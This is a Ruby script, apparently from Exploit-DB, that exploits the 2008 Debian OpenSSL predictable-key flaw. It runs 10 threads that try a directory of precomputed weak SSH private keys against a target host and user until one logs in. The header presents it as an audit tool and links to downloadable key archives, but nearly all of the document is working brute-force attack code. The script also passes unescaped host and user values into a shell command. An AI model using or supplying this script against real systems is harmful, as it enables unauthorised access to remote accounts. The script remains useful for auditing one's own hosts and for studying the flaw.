#!/usr/bin/ruby
#
# Debian SSH Key Tester
# L4teral <l4teral [at] gmail com>
#
# This tool helps to find user accounts with weak SSH keys
# that should be regenerated with an unaffected version
# of openssl.
# 
# You will need the precalculated keys provided by HD Moore
# See http://metasploit.com/users/hdm/tools/debian-openssl/
# for further information.
#
# Common Keys:
#
# https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/5632.tar.bz2 (debian_ssh_dsa_1024_x86.tar.bz2)
# https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/5622.tar.bz2 (debian_ssh_rsa_2048_x86.tar.bz2)
#
#
# Usage:
# debian_openssh_key_test.rb <host> <user> <keydir>
#
# E-DB Note: See here for an update ~ https://github.com/offensive-security/exploitdb/pull/76/files
#

require 'thread'

THREADCOUNT = 10
KEYSPERCONNECT = 3

raise "Usage: #{__FILE__} <host> <user> <keys_dir>" unless ARGV.length == 3
host, user, keysdir = ARGV
counter = 1
queue = Dir.new(keysdir).reduce(Queue.new) do |mem, file|
  file =~ /\d+$/ ? mem << File.join(keysdir, file) : mem
end
totalkeys = queue.length

def ssh_connects?(user, host, keys)
  key_args = Array.new(keys.length, '-i').zip(keys).join(' ')
  no_paswd = '-o PasswordAuthentication=no'
  system("ssh -q -l #{user} #{no_paswd} #{key_args} #{host} exit")
end

threads = Array.new(THREADCOUNT) do
  Thread.new do
    until queue.empty?
      keys = [].tap { |k| KEYSPERCONNECT.times { k << queue.pop unless queue.empty? } }
      keys.each do |k|
      $stdout.write("\rTrying Key #{counter}/#{totalkeys} #{k}")
        counter += 1
      end
      next unless ssh_connects?(user, host, keys)
      winner = keys.find { |key| ssh_connects?(user, host, [key]) }
      puts '', "KEYFILE FOUND: #{winner}"
      exit
    end
  end
end
trap('SIGINT') { threads.map(&:exit) }
threads.map(&:join)

# milw0rm.com [2008-05-16]


